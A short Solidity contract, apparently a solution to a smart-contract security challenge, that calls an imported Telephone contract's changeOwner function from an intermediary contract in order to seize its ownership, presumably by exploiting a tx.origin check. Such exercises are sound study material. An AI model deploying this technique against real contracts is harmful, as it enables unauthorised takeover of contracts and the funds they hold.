// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneDrop {

    address private telephone_address;

    constructor(address _telephone) {
        telephone_address = _telephone;
    }

    function dropOwner(address newOwner) external {
        Telephone tel = Telephone(telephone_address);
        tel.changeOwner(newOwner);
    }
}
